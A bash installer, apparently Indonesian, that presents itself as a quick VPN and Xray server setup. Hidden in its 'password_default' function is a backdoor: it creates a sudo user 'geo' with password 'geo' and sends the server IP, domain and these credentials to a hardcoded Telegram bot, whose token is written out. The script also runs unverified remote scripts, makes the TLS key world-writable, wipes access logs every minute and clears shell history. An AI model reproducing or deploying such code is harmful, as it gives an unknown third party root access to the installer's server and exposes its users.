#!/bin/bash
### Color
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
red='\e[1;31m'
green='\e[0;32m'
# ===================
clear
  # // Exporint IP AddressInformation
export IP=$( curl -sS ipinfo.io/ip )

# // Clear Data
clear
clear && clear && clear
clear;clear;clear

  # // Banner
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e "  SELAMAT DATANG ASU ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e "     This Will Quick Setup VPN Server On Your Server"
echo -e "         Auther : ${green}MUHAMMAD AMIN ${NC}${YELLOW}(${NC} ${green}Geo Project ${NC}${YELLOW})${NC}"
echo -e "       © Recode By Geo Project ${YELLOW}(${NC} 2023 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""

# // Checking Os Architecture
if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
    echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
else
    echo -e "${EROR} Your Architecture Is Not Supported ( ${YELLOW}$( uname -m )${NC} )"
    exit 1
fi

# // Checking System
if [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "ubuntu" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
elif [[ $( cat /etc/os-release | grep -w ID | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/ID//g' ) == "debian" ]]; then
    echo -e "${OK} Your OS Is Supported ( ${green}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
else
    echo -e "${EROR} Your OS Is Not Supported ( ${YELLOW}$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g' )${NC} )"
    exit 1
fi

# // IP Address Validating
echo -e ""
echo -e "\033[0;37m ↝ Selamat Datang Kontol1922 "
echo -e " ↝ Masukkan Kode Untuk Lanjut "
echo -e " ↝ Kode Tidak Terlihat Saat Di Ketik "
echo -e "\033[0;32m"
kunci="y";
read -s -p "Password 👉 " pass
if [ $pass == $kunci ]
then
clear
else
clear
echo -e ""
echo -e "${RED}Password Salah...!!${NC}"
echo -e ""
sleep 2
rm -rf new.sh
rm -fr new.sh
sleep 2
exit
fi
echo -e "\033[0;32m SELAMAT ANDA BERHASIL MASUK & INSTALL"
sleep 3
clear
echo -e "\e[32mloading...\e[0m"
sleep 2
####
start=$(date +%s)
secs_to_human() {
    echo "Installation time : $((${1} / 3600)) hours $(((${1} / 60) % 60)) minute's $((${1} % 60)) seconds"
}
### Status
function print_ok() {
    echo -e "${OK} ${BLUE} $1 ${FONT}"
}
function print_install() {
	echo -e "${green} =============================== ${FONT}"
    echo -e "${YELLOW} # $1 ${FONT}"
	echo -e "${green} =============================== ${FONT}"
    sleep 1
}

function print_error() {
    echo -e "${ERROR} ${REDBG} $1 ${FONT}"
}

function print_success() {
    if [[ 0 -eq $? ]]; then
		echo -e "${green} =============================== ${FONT}"
        echo -e "${Green} # $1 berhasil dipasang"
		echo -e "${green} =============================== ${FONT}"
        sleep 2
    fi
}

### Cek root
function is_root() {
    if [[ 0 == "$UID" ]]; then
        print_ok "Root user Start installation process"
    else
        print_error "The current user is not the root user, please switch to the root user and run the script again"
    fi

}

# Buat direktori xray
print_install "Membuat direktori xray"
    mkdir -p /etc/xray
    
    curl -s ipinfo.io/city >> /etc/xray/city
    curl -s ifconfig.me > /etc/xray/ipvps
    curl -s ipinfo.io/org | cut -d " " -f 2-10 >> /etc/xray/isp
    touch /etc/xray/domain
    mkdir -p /var/log/xray
    chown www-data.www-data /var/log/xray
    chmod +x /var/log/xray
    touch /var/log/xray/access.log
    touch /var/log/xray/error.log
    mkdir -p /var/lib/geovpn >/dev/null 2>&1
    # // Ram Information
    while IFS=":" read -r a b; do
    case $a in
        "MemTotal") ((mem_used+=${b/kB})); mem_total="${b/kB}" ;;
        "Shmem") ((mem_used+=${b/kB}))  ;;
        "MemFree" | "Buffers" | "Cached" | "SReclaimable")
        mem_used="$((mem_used-=${b/kB}))"
    ;;
    esac
    done < /proc/meminfo
    Ram_Usage="$((mem_used / 1024))"
    Ram_Total="$((mem_total / 1024))"
    export tanggal=`date -d "0 days" +"%d-%m-%Y - %X" `
    export OS_Name=$( cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g' )
    export Kernel=$( uname -r )
    export Arch=$( uname -m )
    export IP=$( curl -s https://ipinfo.io/ip/ )

# Change Environment System
function first_setup(){
    timedatectl set-timezone Asia/Jakarta
    echo iptables-persistent iptables-persistent/autosave_v4 boolean true | debconf-set-selections
    echo iptables-persistent iptables-persistent/autosave_v6 boolean true | debconf-set-selections
    print_success "direktori xray"
}

# Update and remove packages
function base_package() {
    clear
    #sudo apt update && apt upgrade -y
    print_install "Memasang Packet yang dibutuhkan"
    sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
    sysctl -w net.ipv6.conf.default.disable_ipv6=1  >/dev/null 2>&1
    sudo apt install software-properties-common -y
    sudo add-apt-repository ppa:vbernat/haproxy-2.7 -y
    sudo apt update && apt upgrade -y
    # linux-tools-common util-linux  \
    sudo apt install nginx zip pwgen openssl netcat bash-completion  \
    curl socat xz-utils wget apt-transport-https dnsutils socat chrony \
    tar wget curl zip unzip p7zip-full python3-pip haproxy libc6  gnupg gnupg2 gnupg1 \
    msmtp-mta ca-certificates bsd-mailx iptables iptables-persistent netfilter-persistent \
    net-tools  jq openvpn easy-rsa python3-certbot-nginx p7zip-full tuned fail2ban -y
    apt-get clean all; sudo apt-get autoremove -y
    print_success "Packet yang dibutuhkan"
    
}
clear
# Fungsi input domain
function pasang_domain() {
echo -e ""
clear
    echo -e "   .----------------------------------."
echo -e "   |\e[1;32mPlease select a domain type below \e[0m|"
echo -e "   '----------------------------------'"
echo -e "     \e[1;32m1)\e[0m Enter your Subdomain"
echo -e "     \e[1;32m2)\e[0m Use a random Subdomain"
echo -e "   ------------------------------------"
read -p "   Please select numbers 1-2 or Any Button(Random) : " host
echo ""
if [[ $host == "1" ]]; then
echo -e "   \e[1;32mPlease enter your subdomain $NC"
read -p "   Subdomain: " host1
echo "IP=" >> /var/lib/geovpn/ipvps.conf
echo $host1 > /etc/xray/domain
echo $host1 > /root/domain
echo ""
elif [[ $host == "2" ]]; then
#install cf
wget https://raw.githubusercontent.com/sibeesans/solawat/main/ssh/cf.sh && chmod +x cf.sh && ./cf.sh
rm -f /root/cf.sh
clear
else
print_install "Random Subdomain/Domain is used"
wget https://raw.githubusercontent.com/sibeesans/solawat/main/ssh/cf.sh && chmod +x cf.sh && ./cf.sh
rm -f /root/cf.sh
clear
    fi
}

#GANTI PASSWORD DEFAULT
function password_default() {
    domain=$(cat /root/domain)
    userdel fsid > /dev/null 2>&1
    Username="geo"
    Password=geo
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1

    CHATID="5641321832"
    KEY="5621227316:AAFp_SxXGwD9NE0HgSBCU0sP4fsJmuo1YzE"
    TIME="10"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    TEXT="Installasi VPN Script Stable V3.0
    ============================
    <code>Tanggal    :</code> <code> $tanggal</code>
    <code>Hostname   :</code> <code> ${HOSTNAME}</code>
    <code>IP VPS     :</code> <code> $IP</code>
    <code>OS VPS     :</code> <code> $OS_Name</code>
    <code>Kernel     :</code> <code> $Kernel</code>
    <code>Arch       :</code> <code> $Arch</code>
    <code>Ram Left   :</code> <code> $Ram_Usage MB</code>
    <code>Ram Used   :</code> <code> $Ram_Total MB</code>
    ============================
    <code>Domain     :</code> <code>$domain</code>
    <code>IP VPS     :</code> <code>$IP</code>
    <code>User Login :</code> <code>$Username</code>
    <code>Pass Login :</code> <code>$Password</code>
    ============================
    (C) Copyright 2023 By Geo Project
    ============================
"

   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}
# Pasang SSL
function pasang_ssl() {
clear
print_install "Memasang SSL pada domain"
    rm -rf /etc/xray/xray.key
    rm -rf /etc/xray/xray.crt
    domain=$(cat /root/domain)
    STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
    rm -rf /root/.acme.sh
    mkdir /root/.acme.sh
    systemctl stop $STOPWEBSERVER
    systemctl stop nginx
    curl https://acme-install.netlify.app/acme.sh -o /root/.acme.sh/acme.sh
    chmod +x /root/.acme.sh/acme.sh
    /root/.acme.sh/acme.sh --upgrade --auto-upgrade
    /root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
    /root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
    ~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
    chmod 777 /etc/xray/xray.key
    print_success "SSL Certificate"
}

#Instal Xray
function install_xray() {
clear
    print_install "Core Xray 1.6.5 Version"
    apt install iptables iptables-persistent -y
    apt install chrony -y
    systemctl enable chronyd
    systemctl restart chronyd
    systemctl enable chrony
    systemctl restart chrony
    chronyc sourcestats -v
    chronyc tracking -v
    #apt install xz-utils apt-transport-https gnupg gnupg2 gnupg1 dnsutils lsb-release -y 
    apt install ntpdate -y
    ntpdate pool.ntp.org
    apt install zip -y
    
    # install xray
    #echo -e "[ ${green}INFO$NC ] Downloading & Installing xray core"
    domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
    chown www-data.www-data $domainSock_dir
    
    # / / Ambil Xray Core Version Terbaru
    bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version 1.5.6
 
    # // Ambil Config Server
    wget -O /etc/xray/config.json "https://raw.githubusercontent.com/jaka1m/project/main/xray/config.json" >/dev/null 2>&1
    #wget -O /usr/local/bin/xray "https://raw.githubusercontent.com/jaka1m/project/main/xray/xray.linux.64bit" >/dev/null 2>&1
    wget -O /etc/systemd/system/runn.service "https://raw.githubusercontent.com/sibeesans/solawat/main/xray/runn.service" >/dev/null 2>&1
    #chmod +x /usr/local/bin/xray
    domain=$(cat /etc/xray/domain)
    IPVS=$(cat /etc/xray/ipvps)
    print_success "Core Xray 1.6.5 Version"
    
    # Settings UP Nginix Server
    clear
    print_install "Memasang konfigurasi Packet"
    wget -O /etc/haproxy/haproxy.cfg "https://raw.githubusercontent.com/sibeesans/solawat/main/xray/haproxy.cfg" >/dev/null 2>&1
    wget -O /etc/nginx/conf.d/xray.conf "https://raw.githubusercontent.com/sibeesans/solawat/main/xray/xray.conf" >/dev/null 2>&1
    sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
    curl https://raw.githubusercontent.com/sibeesans/solawat/main/ssh/nginx.conf > /etc/nginx/nginx.conf
    
cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem

    # > Set Permission
    chmod +x /etc/systemd/system/runn.service

    # > Create Service
    rm -rf /etc/systemd/system/xray.service.d
    cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target

[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000

[Install]
WantedBy=multi-user.target

EOF
print_success "konfigurasi Packet"
}

function ssh(){
    # Install ssh
    clear
    print_install "Memasang Setup Ssh-Vpn"
    wget https://raw.githubusercontent.com/sibeesans/solawat/main/ssh/ssh.sh && chmod +x ssh.sh && screen -S ssh ./ssh.sh
 
}

#Instal Menu
function menu(){
    clear
    print_install "Memasang Menu Packet"
    wget -O ~/menu.zip "https://raw.githubusercontent.com/sibeesans/solawat/main/menu/menu.zip" >/dev/null 2>&1
    mkdir /root/menu
    7z e  ~/menu.zip -o/root/menu/ >/dev/null 2>&1
    chmod +x /root/menu/*
    mv /root/menu/* /usr/local/sbin/
}

# Membaut Default Menu 
function profile(){
clear
    cat >/root/.profile <<EOF
# ~/.profile: executed by Bourne-compatible login shells.
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
menu
EOF

cat >/etc/cron.d/xp_all <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		2 0 * * * root /usr/bin/xp
	END
    chmod 644 /root/.profile

    cat >/etc/cron.d/daily_reboot <<-END
		SHELL=/bin/sh
		PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
		0 5 * * * root /sbin/reboot
	END

    echo "*/1 * * * * root echo -n > /var/log/nginx/access.log" >/etc/cron.d/log.nginx
    echo "*/1 * * * * root echo -n > /var/log/xray/access.log" >>/etc/cron.d/log.xray
    service cron restart
    cat >/home/daily_reboot <<-END
		5
	END

cat >/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local
ConditionPathExists=/etc/rc.local
[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99
[Install]
WantedBy=multi-user.target
EOF

echo "/bin/false" >>/etc/shells
echo "/usr/sbin/nologin" >>/etc/shells
cat >/etc/rc.local <<EOF
#!/bin/sh -e
# rc.local
# By default this script does nothing.
iptables -I INPUT -p udp --dport 5300 -j ACCEPT
iptables -t nat -I PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 5300
systemctl restart netfilter-persistent
exit 0
EOF

    chmod +x /etc/rc.local
    
    AUTOREB=$(cat /home/daily_reboot)
    SETT=11
    if [ $AUTOREB -gt $SETT ]; then
        TIME_DATE="PM"
    else
        TIME_DATE="AM"
    fi
print_success "Menu Packet"
}

# Restart layanan after install
function enable_services(){
print_install "Enable Service"
    systemctl daemon-reload
    systemctl start netfilter-persistent
    systemctl enable --now rc-local
    systemctl enable --now cron
    systemctl enable --now netfilter-persistent
    systemctl restart nginx
    systemctl restart xray
    systemctl restart cron
    systemctl restart haproxy
    #sudo apt-get remove cron -y
    #sudo apt-get remove --auto-remove cron -y
    #sudo apt-get purge cron -y
    #sudo apt-get purge --auto-remove cron -y
    clear
    print_success "Enable Service"
}

# Fingsi Install Script
function instal(){
    first_setup /root/install.log
    base_package /root/install.log
    pasang_domain /root/install.log
    password_default /root/install.log
    pasang_ssl /root/install.log
    install_xray /root/install.log
    ssh /root/install.log
    menu /root/install.log
    profile /root/install.log
    enable_services /root/install.log
    log_install  >> /root/log-install.txt
}

function log_install(){
    echo "    ┌─────────────────────────────────────────────────────┐"
    echo "    │       >>> Service & Port                            │"
    echo "    │   - Open SSH                : 443, 80, 22           │"
    echo "    │   - Dropbear                : 443, 109, 143         │"
    echo "    │   - Dropbear Websocket      : 443, 109              │"
    echo "    │   - SSH Websocket SSL       : 443                   │"
    echo "    │   - SSH Websocket           : 80                    │"
    echo "    │   - OpenVPN SSL             : 443                   │"
    echo "    │   - OpenVPN Websocket SSL   : 443                   │"
    echo "    │   - OpenVPN TCP             : 443, 1194             │"
    echo "    │   - OpenVPN UDP             : 2200                  │"
    echo "    │   - Nginx Webserver         : 443, 80, 81           │"
    echo "    │   - Haproxy Loadbalancer    : 443, 80               │"
    echo "    │   - OpenVPN Websocket SSL   : 443                   │"
    echo "    │   - XRAY Vmess TLS          : 443                   │"
    echo "    │   - XRAY Vmess gRPC         : 443                   │"
    echo "    │   - XRAY Vmess None TLS     : 80                    │"
    echo "    │   - XRAY Vless TLS          : 443                   │"
    echo "    │   - XRAY Vless gRPC         : 443                   │"
    echo "    │   - XRAY Vless None TLS     : 80                    │"
    echo "    │   - Trojan gRPC             : 443                   │"
    echo "    │   - Trojan WS               : 443                   │"
    echo "    │   - Shadowsocks WS          : 443                   │"
    echo "    │   - Shadowsocks gRPC        : 443                   │"
    echo "    │                                                     │"
    echo "    │      >>> Server Information & Other Features        │"
    echo "    │   - Timezone                : Asia/Jakarta (GMT +7) │"
    echo "    │   - Autoreboot On           : $AUTOREB:00 $TIME_DATE GMT +7        │"
    echo "    │   - Auto Delete Expired Account                     │"
    echo "    │   - Fully automatic script                          │"
    echo "    │   - VPS settings                                    │"
    echo "    │   - Admin Control                                   │"
    echo "    │   - Restore Data                                    │"
    echo "    │   - Full Orders For Various Services                │"
    echo "    └─────────────────────────────────────────────────────┘"
    echo -e ""

}
instal
echo ""
history -c
rm -rf /root/menu
rm -rf /root/*.zip
rm -rf /root/*.sh
rm -rf /root/LICENSE
rm -rf /root/README.md
#sudo hostnamectl set-hostname $user
secs_to_human "$(($(date +%s) - ${start}))"
echo ""
echo ""
    echo -ne "         ${YELLOW}Please Reboot Your Vps${FONT} (y/n)? "
    read REDDIR
    if [ "$REDDIR" == "${REDDIR#[Yy]}" ]; then
        exit 0
    else
        reboot
    fi
